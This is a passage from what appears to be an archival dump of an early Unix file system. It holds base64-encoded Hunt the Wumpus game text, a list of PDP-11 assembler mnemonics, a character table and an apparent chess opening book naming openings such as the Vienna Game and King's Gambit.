VlZGluZyByb29tIG11c3QgYmUKAAljb25uZWN0ZWQgdG8gdGhlIHByZXZpb3VzIHJvb20u
CgAJSWYgdGhlcmUgaXMgbm8gdHVubmVsIGJldHdlZW4gdHdvIG9mIHRoZSByb29tcwoACW
luIHRoZSBhcnJvdydzIHBhdGgsIHRoZSBhcnJvdyBjaG9vc2VzIG9uZSBvZiB0aGUKAAl0
aHJlZSB0dW5uZWxzIGZyb20gdGhlIHJvb20gaXQncyBpbiBhbmQgZ29lcyBpdHMKAAlvd2
4gd2F5LgoACgAJSWYgdGhlIGFycm93IGhpdHMgdGhlIHd1bXB1cywgeW91IHdpbiEKAAlJ
ZiB0aGUgYXJyb3cgaGl0cyB5b3UsIHlvdSBsb3NlIQoACgBXYXJuaW5nczoKAAoAV2hlbi
B5b3UgYXJlIG9uZSBvciB0d28gcm9vbXMgYXdheSBmcm9tIHRoZSB3dW1wdXMsCgB0aGUg
Y29tcHV0ZXIgc2F5czoKAAkJJ0kgc21lbGwgYSBXdW1wdXMnCgBXaGVuIHlvdSBhcmUgb2
5lIHJvb20gYXdheSBmcm9tIHNvbWUgb3RoZXIgaGF6YXJkLCBpdCBzYXlzOgoACQlCYXQg
ICAgLSAnQmF0cyBuZWFyYnknCgAJCVBpdCAgICAtICdJIGZlZWwgYSBkcmFmdCcKAAoASW
5zdHJ1Y3Rpb25zPyAoeS1uKSAAWW91IGFyZSBpbiByb29tICVkCgBZb3UgZmVsbCBpbnRv
IGEgcGl0CgBZb3Ugd2VyZSBlYXRlbiBieSB0aGUgd3VtcHVzCgBUaGVyZXMgYSBiYXQgaW
4geW91ciByb29tCgBJIHNtZWxsIGEgd3VtcHVzCgBCYXRzIG5lYXJieQoASSBmZWVsIGEg
ZHJhZnQKAFRoZXJlIGFyZSB0dW5uZWxzIHRvACAlZAAKAE1vdmUgb3Igc2hvb3QgKG0tcy
kgAHdoaWNoIHJvb20/IABZb3UgaGl0IHRoZSB3YWxsCgBHaXZlIGxpc3Qgb2Ygcm9vbXMg
dGVybWluYXRlZCBieSAwCgBZb3Ugc2hvdCB5b3Vyc2VsZgoAWW91IHNsZXcgdGhlIHd1bX
B1cwoAVGhhdCB3YXMgeW91ciBsYXN0IHNob3QKAEFub3RoZXIgZ2FtZT8gKHktbikgAFNh
bWUgcm9vbSBzZXR1cD8gKHktbikgAAD8//D//f/4/wSJ+BYAAAEA
-- /usr/ken mode=0140777 uid=6 gid=1 atime=174929472 mtime=170549865 --
-- /usr/lib mode=0140775 uid=3 gid=3 atime=174843151 mtime=169271760 --
-- /usr/lib/aign mode=0100664 uid=3 gid=3 atime=169848893 mtime=169259120 --
.
..
r0
r1
r2
r3
r4
r5
sp
pc
csw
mov
movb
cmp
cmpb
bit
bitb
bic
bicb
bis
bisb
add
sub
br
bne
beq
bge
blt
bgt
ble
bpl
bmi
bhi
blos
bvc
bvs
bhis
bec
bcc
blo
bcs
bes
jbr
jne
jeq
jge
jlt
jgt
jle
jpl
jmi
jhi
jlos
jvc
jvs
jhis
jec
jcc
jlo
jcs
jes
clr
clrb
com
comb
inc
incb
dec
decb
neg
negb
adc
adcb
sbc
sbcb
tst
tstb
ror
rorb
rol
rolb
asr
asrb
asl
aslb
jmp
swab
jsr
rts
sys
clc
clv
clz
cln
sec
sev
sez
sen
cfcc
setf
setd
seti
setl
clrf
negf
absf
tstf
movf
movif
movfi
movof
movfo
addf
subf
mulf
divf
cmpf
modf
movie
movei
ldfps
stfps
fr0
fr1
fr2
fr3
fr4
fr5
als
alsc
mpy
mul
div
ash
ashc
dvd
xor
sxt
mark
sob
.byte
.even
.if
.endif
.globl
.text
.data
.bss
.comm
-- /usr/lib/atab mode=0100664 uid=3 gid=3 atime=174920716 mtime=174920716 base64=1 --
AAAAAAAAAAAAAAAAAAAAAAAAAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAFAAAAAAAAAAAABQAAAAAAAAAAAAAAAAABAAUACgAKAAoACgAK
AAoACgAKAAoACgAAAAAABQAAAAAAAAAAAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQ
ABAAEAAQABAAEAAQABAAEAAQABAAEAAQAAAAUAAAAAAAEAAAABAAEAAQABAAEAAQABAAEA
AQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAAAAAAAAAAAAAAIAAgACAA
IAAgACAAIAAgACAAIAAwACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC
AAIAAgACAAIABQACAAIAAgACAAUAAgACAAIAAgACAAIAAAAFAAAAAAAAAAAAAAAAAAAAAA
AAAAAABAACAAUAAgACAAIAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAgAFAAIAAgAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAgACAAIAAgALAAsACwALAAsACwAL
AAsACwALAAMACwALAAsACwALAAsACwALAAsACwALAAsACwALAAsACwALAAsACwALAAsACw
ALAAsACwALAAsACwALAAsACwALAAsACwALAAsABQAAAAAAAAAAAAAAAAAAAAAAAAAAAAsA
CwALAAsACwALAAsAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAsACwALAAsACwALAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALAAsACwALAAsA
-- /usr/lib/book mode=0110664 uid=3 gid=3 atime=174890145 mtime=169848565 base64=1 --
NuFWaWVubmEgR2FtZQBLaW5nJ3MgR2FtYml0IERlY2xpbmVkAAAlNQAA//8TGiYA//8gGi
wA//8DDDIA//8mJTgA//8fJT4A//8uJkQA//8VH0oA//8DIwAA//86JVYA//8bJFwA//8q
I2IA//8SG2gA//8yKm4A//8KEnQA//8iG3oA//8TGoAA//8NHQAA//8eJYwA//8fJZIA//
8OHpgA//8VH54A//86JaQA//8DDKoA//8gGoYAIimwAP//CRm2AP//PDvAAP//BwXGAP//
OiVQAC4OzAD//yYkAAD//wIB3AD//w4m4gD//wQC6AD//zoX7gD//wMM9AD//z89+gD//x
UkAAH//yUcBgH//wcFDAH//y4OEgH//wkYAAD//xwlHgH//zolJAH//x8lKgH//zYvMAH/
/wsvNgH//y4vPAH//xUfQgH//zEpSAH//wMLTgH//xoJVAH//z0tAAD//wkZYAH//z89Zg
H//woSbAH//yUdcgH//wQGeAH//yYffgH//xMahAH//y4migH//xMaGAEEBloBFR+QAf//
IBqWAf//MjikAf//PDuqAf//LiYAAP//Jx+2Af//PDu8Af//GjXCAf//Ni7IAf//AyfOAf
//OhfUAf//FSTaAf//JRzgAf//IxnmAf//IhnsAf//BwXyAf//Lg74Af//HCXSACMysAEJ
Gf4B//8DFQAA//8cFRIC//8TGhgC//8lHB4C//8ZIiQC//8gGioC//8JGTAC//8tLgQCLT
s2Av//EiM8Av//Oy1GAv//PD4AAP//IxJSAv//MipYAv//FRteAv//JBtkAv//ExtqAv//
MChwAv//CBF2Av//IBF8Av//PD4AAP//CRmIAv//MiqOAv//BAaCAhEYlAL//y01mgL//z
g8AAD//xUkqgL//zoesAL//zUdAAD//w4VvAL//x4VwgL//xwkyAL//zg8zgL//yQr1AL/
/zoe2gL//xwjtgIbJOAC//8qI+YC//8THPAC//8lHPYC//8SG/wC//8yKgID//8KEggD//
8iGw4D//8RGRQD//8tNRoD//8SIyAD//88PiYD//8IESwD//8gETID//8SI6QCAww4A///
Oy0+A///Ji1IA///Ny9OA///JQoAAP//BwVaA///ODtgA///AxVmA///HA1sA///JjtyA/
//LRx4A///Ehx+A///OiWEA///HCWKA///PD6QA///ExqWA///IBqcA///PD4AAP//CRKo
A///GRKuA///BAK0A///OiW6A///HCXAA///IhnGA///ExrMA///IBrSA///DhYAAP//Oz
TeA///JjTkA///LSPqA///EgzwA///GTT2A///CBD8A///IxsCBP//ChEIBP//IBEOBP//
GhEUBP//KyMaBP//HCUgBP//IhkmBP//Pz4AAP//Ji8yBP//Ni04BP//Iy0+BP//MipEBP
//DgATGkoE//8gGlME//88PgAA//8MFV4E//8sGmQE//8EDGoE//8iDXAE//8mO3YE//8t
HHwE//8SHIIE//8lLIgE//8VH44E//86JZQE//8TGpoE//8gGqAE//8mLUwCGhFUAxULog
MDDNgDFR8sBBIjWAQcJaYE//8PFwAA//8XJ8oE//8VBtAE//8lHtYE//8MFNwE//8iFOIE
//8jFOgE//8/Pe4E//8GNvQE//8OF/oE//8FBgAF//86JQYF//8DDAwF//88OxIF//8HBR
gF//8uDh4F//8cJSQF//8tLioF//8SIzAF//87LTYF//8mLTwF//8qIKwENy9CBf//HjMA
AP//DRVSBf//JR5YBf//FR9eBf//OytkBf//AiZqBf//OiVwBf//HCV2Bf//KyJ8Bf//GC
KCBf//MCiIBf//PzwAAP//BwSUBf//PDqaBf//ExugBf//OjOmBf//BAKsBf//OzSyBf//
Awy4Bf//Nia+Bf//AgnEBf//Ny/KBf//FALQBf//JR3WBf//CRLcBf//GRLiBf//Oh4AAP
//FAvuBf//JR30Bf//IxsAAP//GiEABv//KyMGBv//CBDoBQQG+gUcJQwG//8iGRIG//87
LQAA//8aIyYG//8tIywG//87HwAA//8aIzgG//8tIz4G//8VA0QG//8qG0oG//8DFVAG//
8eFVYG//8KEjIGDxdcBv//Oh5iBv//PD4AAP//BAZyBv//Kjt4Bv//HCN+Bv//LCOEBv//
EiOKBv//OiyQBv//AguWBv//OzScBv//EiNsBg8Xogb//yUdqAb//ysjAAD//yMUuAb//z
Iqvgb//w0GxAb//zw+ygb//yYX0Ab//zcv1gb//xUm3Ab//yUc4gb//xMa6Ab//yAa7gb/
/wQN9Ab//yIN+gb//yAaUwT//wkZAAcCJgYH//8qIAwH//88PgAA//8CHRwH//8iKSIH//
8SGygH//8kGy4H//8TGzQH//8qNDoH//8cI0AH//8tI0YH//8KEkwH//86HlIH//8wKQAA
//8YKV4H//8iKWQH//88PQAA//8DJ3AH//8tI3YH//8dFnwH//8bKYIH//8KEogH//8eF4
4H//8CHZQH//8iG5oH//8VG6AH//8qG6YH//8TG6wH//8mHrIH//8SI7gH//82Jr4H//8F
BMQH//83L8oH//8SI1gHEhhqBw8X0Af//yUd1gf//zw6AAD//xIj6gf//zYt8Af//yYt9g
f//zsz/Af//wImAgj//zolCAj//zQ2AAD//xwMFAj//y0lGgj//xMcIAj//yUcJgj//wMT
LAj//zs0Mgj//yYVOAj//zYtPgj//yMtRAj//zIqSgj//xMaUAj//yAaVgj//xIjXAj//y
ogYgj//w4AAiZIBRIYjgUCFCAGCBCyBhIjFgcEBuQHHCUOCBUmaAj//zMrcQj//wESkgj/
/z4tmAj//yIbAAD//yEqpAj//zw+qgj//xUksAj//yQctgj//xohvAj//zMjwgj//wQGyA
j//z4tzgj//zMjAAD//wQG2gj//z404Aj//zQjAAD//xoj7Aj//zw18gj//xwt+Aj//zYu
/gj//wMnBAn//z40Cgn//yYcEAn//zMjFgn//xUmHAn//yUcIgn//zw7AAD//xIcLgn//z
kJNAn//wESOgn//zg5QAn//woaRgn//zEqTAn//xsqUgn//zQkWAn//xUbXgn//yUcZAn/
/wQGagn//zs0cAn//yY0dgn//yI0fAn//wImggn//z8+iAn//xwk5ggEBigJGj6OCf//JB
uUCf//Ni4AAP//FSaoCf//JRyuCf//BAa0Cf//JBu6Cf//MysAAP//AxvGCf//IhvMCf//
CxvSCf//KiTYCf//MyMAAP//BAPkCf//KhvqCf//Ex3wCf//JRz2Cf//DBz8Cf//IjQCCv
//AwwICv//HxwOCv//BAbeCSQTFAr//zsfGgr//wsbwAkVJCQK//8/PioK//8LE54IHCXU
CAsbogkaPjQK//81JToK//86FwAA//8TBFIK//8lHFgK//8PF14K//8tL2QK//8SHGoK//
89LXAK//8cFgAA//8NFXwK//8qG4IK//8hG4gK//8lHY4K//8NGwAA//8GB5oK//8fDaAK
//8FDaYK//8bDawK//8TJLIK//8qJLgK//86FwAA//8OBMQK//8cFcoK//8MFdAK//8kFd
YK//8LG9wK//8bKeIK//8KEugK//8qJO4K//8dDvQK//82JvoK//8THQAL//8fLwYL//8O
FgwL//8lHBIL//8rMnYKEiGUChIjvgoSHBgL//87Hx4L//8kKzAL//8zKzYL//8EBjwL//
88PkIL//8FDEgL//8tHE4L//8cJFQL//8iG1oL//8qIgAA//8DE2YL//84O2wL//8CFHIL
//88PngL//8rDwAA//8WDYQL//8bK4oL//8NFpAL//8jG5YL//8MDZwL//84PKIL//8EDK
gL//8eDK4L//88DAAA//8LG7oL//84PMAL//8PF7QLBQ3GC///PDPMC///Cxt+CwcF1gv/
/xsj3Av//xIM5gv//yUe7Av//wwe8gv//y0e+Av//w0E/gv//zsbBAz//wQNCgz//yINEA
z//yQgAAD//xQbHAz//yUsIgz//wkSKAz//xkSLgz//wQCNAz//zQkOgz//wwVQAz//yIZ
Rgz//w8XTAz//zs0Ugz//wIUWAz//z88Xgz//xIaAAD//zQQagz//wkScAz//xkSdgz//x
0kfAz//zYmggz//xUdiAz//yUejgz//wIUlAz//zs0mgz//wwVoAz//yIZpgz//wsTZAwL
G6wM//88M7IM//8FDBYMAwy8DP//OiXCDP//IBgAAP//BALSDP//Oy3YDP//AxTeDP//Ih
TkDP//AhTqDP//MCDwDP//EgP2DP//LSP8DP//DRUCDf//PD4IDf//IBgAAP//BAIUDf//
MCAaDf//AgsgDf//Oy0mDf//JC0sDf//IhsyDf//Cxs4Df//PD4+Df//NycAAP//DxdKDf
//IitQDf//BQxWDf//OzNcDf//DBViDf//OiVoDf//HC0AAP//AAN0Df//LRx6Df//ExyA
Df//JRyGDf//DBSMDf//IhSSDf//AhSYDf//OyOeDf//DRWkDf//OiWqDf//AhRuDRIcsA
3//z88tg3//wsTwA3//zw1xg3//wsTDg0cJEQNHCXMDf//MSHSDf//HCXMDAMM4A3//zMq
5g3//yQTYAskKvAN//8+LfYN//86JQAA//8SIQYO//8bIQwO//8kFRIO//8zIxgO//8EBh
4O//88PiQO//8hEwAA//8tHDAO//8MFjYO//8zIzwO//8SDEIO//8kG0gO//8VG04O//88
PlQO//8VJCoOBAZaDv//KhtgDv//BSFqDv//Pi1wDv//FSQADhwldg7//wIANSV8Dv//Pi
8AAP//CRGODv//PDqUDv//ChOaDv//JROgDv//DAOmDv//KhusDv//BAyyDv//HAy4Dv//
NycAAP//CRHEDv//LyXKDv//FCXQDv//Pi/WDv//IxTcDv//PDriDv//BQzoDv//HAzuDv
//BQ6+Dg0V9A7//zol+g7//wMMBA///zQcCg///yMbAAD//wsTFg///zw6HA///wUEIg//
/zoXKA///wQGLg///z4tNA///wUMOg///yQMQA///wMMRg///zQkTA///xMkUg///yokWA
///yMcAAD//wocAAD//wYHag///xsMcA///woDAAD//xwjfA///y0jgg///zQldg80I4gP
//8qG44P//8TBJgP//8DCp4P//8jNKQP//8eA6oP//8eDAAA//8AAbYP//88NLwP//8ENM
IP//8bCsgP//8cI84P//8tI9QP//8/PAAA//8AAeAP//88NOYP//8ENOwP//8bCvIP//8S
I9oPHCP4D///Khv+D///EiOwDwMECBD//zoeDhD//xMdZA8EBhgQ//8+LR4Q//8SIxAPHC
ReDwUOKBD//x80LhD//x8tAAD//z4tAAD//w4WQhATBEgQ//88Ok4Q//8EBlgQ//86JV4Q
//86FwAA//8EBWoQ//8bFXAQ//8FDHYQ//8fNHwQ//8FDGQQDhaCEP//KhuIEP//PDoAAP
//BgeYEP//OiWeEP//BAakEP//Pi2qEP//BQywEP//HDS2EP//DRW8EP//HxzCEP//Fw4A
AP//Ew3OEP//HB/UEP//Fw4AAP//AwzgEP//GwzmEP//DRXaEAQG7BD//zoX8hD//yMU/B
D//x8cAhH//yMUyBAFDAgR//8qGw4R//8OFjwQHCOSEBIjGBH//zMjHhH//zcvAAD//wQV
MhH//z40OBH//xMEPhH//xwlRBH//zosAAD//wELUBH//zcvVhH//wQVXBH//xwlYhH//w
sTaBH//yMbbhH//woSdBH//z40ehH//wESShETBIAR//8zI4YR//8EBpAR//8fHJYR//8B
EiwRBQycEf//IimiEf//JBOsEf//Ox+yEf//IiQAAP//CRm+Ef//IyLEEf//BgXKEf//Ig
3QEf//IRrWEf//PjTcEf//DDQAAP//AgvoEf//EwzuEf//Nj/0Ef//IxP6Ef//HjYAEv//
NSUGEv//Ax4MEv//PDoSEv//JBMYEv//JRMeEv//BQTiESETJBL//zolKhL//wQGNBL//x
wbOhL//wsbQBL//zsjRhL//xUkTBL//yMcUhL//wUhWBL//zMjXhL//zs0AAD//wMMahL/
/z4tcBL//wESdhL//zUlfBL//wUMAAD//yUeiBL//xQcjhL//zollBL//xwlmhL//z4toB
L//w0UphL//ykUrBL//wIUshL//yo0uBL//xkhvhL//zAgxBL//wgYyhL//yIp0BL//wkZ
1hL//zUl3BL//woS4hL//zMr6BL//wUaTAoBEokOFSS4EQoSZBIFIYISCxPuEv//OyMAAP
//Ax4OE///Oh4UE///FR4aE///MiogE///Ah0mE///LR4sE///EiMyE///KyQ4E///GyQ+
E///AwsAAP//GQtKE///AgtQE///KxlWE///EiFcE///Fg0AAP//NCVoE///AwxuE///Kj
R0E///HRZ6E///OzyAE///Ah2GE///KiREEyo0YhM6LIwT//8BEpIT//88PqAT//8MFaYT
//8cHawT//8NHbIT//89K7gT//8EBr4T//8CHQAA//8tHMoT//8VHNAT//86LNYT//8NFd
wT//8LHAAA//86JegT//8BC+4T//87K/QT//8MBfoT//89BQAU//8dKwYU//88PgwU//8C
HRIU//8tHBgU//8VHB4U//89KyQU//8NFSoU//8CLwAA//88PjYU//8nDDwU//82LkIU//
8VJ0gU//8rI04U//8MFVQU//8cHVoU//8NHWAU//8qIuITKyMwFD00ZhT//wQGbBT//zEq
ehT//yQqgBT//zcnAAD//wQGjBT//zolkhT//xokmBT//ysjnhT//yQapBT//zMrqhT//w
0dsBT//zMjxBMzK4YUOzS2FP//BQy8FP//AxsAAP//OzzQFP//AhTWFP//Pj/cFP//Iyri
FP//PD7oFP//BRruFP//EiMAAP//KiP6FP//AwwAFf//HgwGFf//BQwMFf//PTT0FDoeEh
X//wESGBX//z4tIhX//xsjKBX//zEqLhX//yQqNBX//xIDAAD//zg5QBX//yIURhX//zQl
TBX//xQiUhX//zw+WBX//wQGXhX//yoiZBX//wUaahX//z40cBX//wMLdhX//zQtfBX//w
IUghX//z00iBX//wESjhX//y0ulBX//xsjmhX//zEqoBX//yQqphX//zMrrBX//w0VshX/
/z4tyhQzKzoVOy24Ff//FSS+Ff//AiYAAP//Mx7SFf//GxXYFf//KiLeFf//AwzkFf//PT
TqFf//BQTwFf//Pi32Ff//BAb8Ff//MSoCFv//ISoIFv//JTMOFv//FRsUFv//OiUaFv//
BSEgFv//GyMAAP//JBsmFiQcLBb//xwlMhb//xIcAAD//z00Qhb//wImSBb//z4tThb//w
ESVBb//yUcWhb//wMbYBb//yobZhb//xUbbBb//wIAJRzMFTMrPBYkG3IW//8LG3sW//8I
EAAA//8yKo4W//8UJpQW//8xIZoW//8bEaAW//8wKKYW//8VDKwW//8zK7IW//8EBrgW//
8qJL4W//8MFcQW//89PMoW//8FDNAW//88PtYW//8BEtwW//8EBgAA//87M+gW//8DC+4W
//86JfQW//8bJfoW//80JQAX//8cJQYX//81JQwX//8FDBIX//8zKxgX//8BEh4X//88Pi
QX//8KGioX//8+LeIWPjQwF///AhQ2F///PTZAF///FRtGF///JBtMF///CxtSF///Rm91
ciBLbmlnaHRzIEdhbWUAIxQAAP//BAJwF///Pzx2F///AhR8F///PjeCF///JhWIF///Ny
+OF///EhqUF///BAYAAP//PzygF///AgumF///PjesF///JhWyF///MyO4F///EhG+F///
Ny/EF///BQzKF///GSOaFzs00Bf//yQS1hf//x4OAAD//yct5hf//x8e7Bf//wcEAAD//y
s0+Bf//zYb/hf//zQrBBj//xs2Chj//y00EBj//x8bFhj//y4tHBj//x4nIhj//z4IKBj/
/wUOLhj//yUe8hc7PjQY//8OHjoY//8KAEQY//8EA0oY//8uPQAA//8fFlYY//8kLlwY//
8nH2IY//8WHmgY//8zK24Y//8CFHQY//8/PXoY//8NFoAY//8eFoYY//8PF4wY//8lHpIY
//8MHpgY//8fHp4Y//8FDKQY//87H6oY//8VJLAY//8uJ7YY//8fJ7wY//8KAMIY//8EA8
gY//8EAwAA//8uNdQY//8VH9oY//8ZCs4YOx/gGP//JhXmGP//GQpQGDcv8Bj//xYf9hj/
/y0nABn//yQWBhn//zU+4Bc1LgwZ//8VJhIZ//88NRwZ//8MJCIZ//8cLSgZ//8LEy4Z//
8qGTQZ//8jGToZ//8JEQAA//84OkYZ//8bIUwZ//8ZKlIZ//8IEFgZ//86M14Z//8EDWQZ
//8zK2oZ//8NFXAZ//8IEAAA//8/PHYZMiJ8Gf//FRuCGf//PDSMGf//JDSSGf//OzSYGf
//DCSeGf//KhmkGf//IxmqGf//NSVAGRwtsBn//wMMthn//x0mAAD//y8mxhn//w0dzBn/
/zcv0hn//xUm2Bn//zMr3hn//wAE5Bn//ys86hn//wML8Bn//yAL9hn//wIL/Bn//xMLAh
r//wQVCBr//xwTDhr//wsTFBr//zw+Ghr//xUEIBr//y0qAAD//yIyLBr//xUdAAD//z8+
OBr//yIjPhr//yAyMhogC0Qa//8dMkoa//89PFQa//8nIloa//87LWAa//8jLWYa//8cLW
wa//8NFXIa//8rHHga//8CHX4a//8+P4Qa//8DJ4oa//8kG5Aa//8VG5Ya//8qG5wa//8L
G6Ia//8NHQAA//8yKa4a//8jKbQa//88Pboa//8DJ8Aa//8gKcYa//8IEcwa//8bEdIa//
8KEtga//8qG94a//8mH+Qa//8lH+oa//8VH/Aa//81LfYa//8CJvwa//8zKwIb//8LGwgb
//8kHCYaPD6oGislDhv//xoRFBv//wQDAAD//zwzKBv//yQzLhv//ycDNBv//xUkOhv//x
4nQBv//w8XRhv//yApTBv//wkZUhv//zUlWBv//wUEXhv//zszZBv//woSahv//zoecBv/
/wsbdhv//wIUAAD//zsrghv//yQriBv//zMrjhv//xsklBv//yokmhv//xUkoBv//zw+ph
v//xojrBv//y0jshv//wsbuBv//xwrIhszK3wbHC2+G///BAbEG///LRzSG///BRrYG///
GiMAAP//KiPkG///GyPqG///JSzwG///BRr2G///Pzz8G///BAICHP//NDUIHP//JhQOHP
//NS0UHP//AiYaHP//OiUgHP//CxsmHP//GSssHP//ChIyHP//BAsAAP//KyM+HP//ExtE
HP//MitKHP//HStQHP//NCtWHP//Ah1cHP//OixiHP//CxNoHP//PDQ4HBk0bhz//xw0dB
z//zs0fhz//xUchBz//zMqihz//wMVkBz//xwVlhz//yMqnBz//wMYAAD//xkrqBz//wwD
rhz//zg6tBz//wIduhz//zoxwBz//wsTxhz//zEpzBz//woa0hz//zst2Bz//wQG3hz//z
Ul5Bz//wUM6hz//zw+8Bz//wMV9hz//yQb/Bz//xUbAh3//yQcohwqGwgd//8cIw4d//8V
GwAA//88Ph4d//8kFCQd//8zKyod//8EAjAd//87NDYd//8jNDwd//8iNEId//8CJkgd//
8bLE4d//8MJFQd//8eJQAA//83L2Ad//8LHGYd//8tJmwd//8MHnId//82LXgd//8jLX4d
//86HoQd//8VC4od//8bKZAd//8KEpYd//8zK5wd//8CJqId//8qG1odIhuoHf//CxuuHf
//BAIAAP//Kzy+Hf//AhTEHf//PD7KHf//GhPQHf//GyzWHf//DCTcHf//KhviHf//FRvo
Hf//IhvuHf//Cxv0Hf//HC24HRwr+h3//wMMAB7//wQGAAD//zw+EB7//xoRFh7//zsrHB
7//yIrIh7//yM0KB7//xkiLh7//y0jNB7//wkZOh7//yogQB7//wsTRh7//y0cCh4zK0we
//8FGlIe//8LEwAA//88PmIe//8IGGge//87M24e//8KEnQe//86Hnoe//8EBoAe//8kHA
AA//8IEYwe//8jEZIe//8VC5ge//8sI54e//8cI6Qe//8xKaoe//8aEbAe//8rI7Ye//8C
FLwe//86LMIe//8LE8ge//8zK84e//8EBtQe//8zK4YePD7aHv//BRrgHv//NC3qHv//Iy
3wHv//CBAAAP//MCj8Hv//CRkCH///ChIAAP//Hi8OH///DxcUH///LR4aH///BQQgH///
ODsmH///BAYsH///OjMyH///AAM4H///PC0+H///CBBEH///IytKH///EhpQH///OyNWH/
//HCNcH///NSViH///AgloH///MChuH///CRl0H///Pj96H///BQyAH///Ny8IHy08hh//
/wMKjB///zMjlh///wsTnB///xkqoh///woSqB///yoZrh///yMZtB///y0cwBkZIN4bLS
MYHRkiXB4ZNPYePD66H///EiPAH///ERgAAP//KBPgH///GBHmH///EyjsH///IRjyH///
FRP4H///GiH+H///MSEEIP//GxoKIP//JCoQIP//FBsWIP//JxUcIP//DBQiIP//HiQoIP
//BAwuIP//PAw0IP//BQw6IP//PzxAIP//GyJGIP//PSJMIP//GBtSIP//BSEAAP//Pz1e
IP//LD1kIP//NDxqIP//ICJwIP//Li12IP//HSV8IP//OzSCIP//MiyIIP//PDuOIP//Iz
KUIP//Jy6aIP//GCCgIP//PDtYIDozpiD//wMYrCD//yQbtiD//xIbvCD//yskwiD//woS
yCD//x8nziD//w4W1CD//zQf2iD//xIj4CD//zIr5iD//yMr7CD//y0e8iD//w0d+CD//z
stAAD//wcPBCH//ycWCiH//w8fECH//y0nFiH//w0VHCH//zoeIiH//yQaKCH//zs0/iA9
Ii4h//8VJDQh//8xIQAA//8hGEQh//8wKEoh//8EDFAh//80DFYh//8VG1wh//87NGIh//
8DDGgh//8kG24h//8LG3Qh//89K3oh//8JEoAh//8jEoYh//8FIYwh//8qGz4hLSOSIf//
HCOYIf//CxsAAP//BRoAAP//BAYAAP//PD60If//Awy6If//GwzAIf//CxPGIf//MyvMIf
//IQzSIf//KhvYIf//BSHeIf//Xhc9GdofMyOiITAoqCE9Iq4hPTTkIf//ARLtIf//PSL0
EjUliBY2LlgXPi0CIv//Ig0AAP//Ni8aIv//Pz4gIv//HjYmIv//Pi0sIv//GxIAAP//Cx
M4Iv//JBs+Iv//FRtEIv//Jg5KIv//Pz0AAP//Ai9WIv//Ji1cIv//CxNiIv//MytoIv//
NSNuIv//Pi90Iv//BhVQIgQFeiL//zw7gCL//xU1iiL//yobkCL//x4PAAD//wYXnCL//y
0eoiL//wsTqCL//zMrriL//xoRtCL//z4tuiL//xUtwCL//yobxiL//wMVzCL//yYt0iL/
/wMVliIOFtgi//87Jt4i//8GFYkOAx4yIgUa6CL//wIAPSLuIv//MyMAAP//Jy4AAP//Gh
EKI///KiAQI///DBwWI///PD4cI///AwwiI///PSsoI///CRIuI///IxI0I///ARI6I///
HidAI///DxdGI///Oh5MI///NSUAAP//AhRYI///IyxeI///DBJkI///LCNqI///EiNwI/
//PTR2I///BAZ8I///PDqCI///BgyII///OzOOI///GhGUI///OiyaI///BhVSIwESoCP/
/y0jpiP//xwjsCP//zMjtiP//1RocmVlIEtuaWdodHMgR2FtZQAAPTYAAP//JwzWI///Ni
7cI///AyfiI///OyPoI///CxPuI///MSr0I///HCr6I///NSUAJP//ExwGJP//IxwMJP//
GhMSJP//MyMYJP//Pz0AAP//BhUkJP//PTQqJP//CxMwJP//Oiw2JP//JBwAAP//FR9CJP
//Ox9IJP//JhVOJP//Ny9UJP//Jx9aJP//NTZgJP//PSsAAP//PSsAAP//HBZsJBwSciT/
/zoleCT//xwmZiQnFYIk//82Logk//89KwAA//89KwAA//8cEpgkHBaeJP//NTykJP//HB
I8JAMnkiQDFa4kHBYAAP//MyO0JP//EhzGJP//PDXMJP//EhweJBo10iT//8IjLRzYJP//
CxO8IwES5ST//z4t6iT//yQdAAD//yobAAD//wIABhUIIgES/yIKGgQjBRr0JA0d+iQFIQ
Al//9GYWxrYmVlciBDb3VudGVyIEdhbWJpdAAGFXsW//8DEQAA//8bEkAl//8KEkYl//8+
NEwl//8EBlIl//87K1gl//8kI14l//8zI2Ql//8FGmol//85KnAl//8GFXYl//8hKgAA//
83L4Il//8CJogl//89NI4l//8FBJQl//8sM5ol//8EBqAl//8zLKYl//8kLKwl//86M7Il
//8FIbgl//8OFgAA//88NMQl//8hMsol//80JtAl//8CJtYl//8rItwl//8bIeIl//8zJO
gl//8FDO4l//8BEgAA//8tCfol//8CCQAm//8kCQYm//8NHQwm//8rJBIm//8bIRgm//8L
FQAA//8kLiQm//8EAiom//8+LTAm//8hEjYm//87NDwm//8DDEIm//8yKkgm//8BC04m//
8NHQAA//8ZIlom//8DDGAm//8ZC1QmOzRmJv//AgtsJv//Kxl2Jv//GyF8Jv//OzT0JTst
HiYzJIIm//8VG4gm//89K5Ym//8kK5wm//8CJgAA//89NKgm//8sNK4m//87NLQm//8MLL
om//83LsAm//8nDMYm//8hEwAA//8yKtIm//8FIdgm//87NN4m//8nP+Qm//8+LcwmNy7q
Jv//JC7wJv//Ni76Jv//AycAJ///JC0AAP//KiIMJ///HSQSJ///MSoYJ///BAweJ///LA
wkJ///JCoqJ///NCwwJ///Giw2J///Oiw8J///AwxCJ///DRUAAP//OSpOJ///AQtUJ///
Nj9aJ///NT9gJ///LRxmJ///JDVsJ///PTZyJ///BQR4J///Jh1+J///BAaEJ///OSpIJz
Ymiif//wIdkCf//zs0mif//wUaoCf//wIUAAD//z02rCf//wQGsif//zw9uCf//wwnvif/
/zYkxCf//x0kyif//zMk0Cf//xsN1if//z023Cf//wUM4if//zIq6Cf//wES7if//zYm9C
f//w0d+if//zkzACj//wMbBij//zosBic+LaYnOzQMKP//FSQSKP//FR8AAP//MyQmKP//
JCwsKP//Ni0yKP//Ji04KP//BAYAAP//MypEKP//ISpKKP//OjNQKP//BSFWKP//OTM+KD
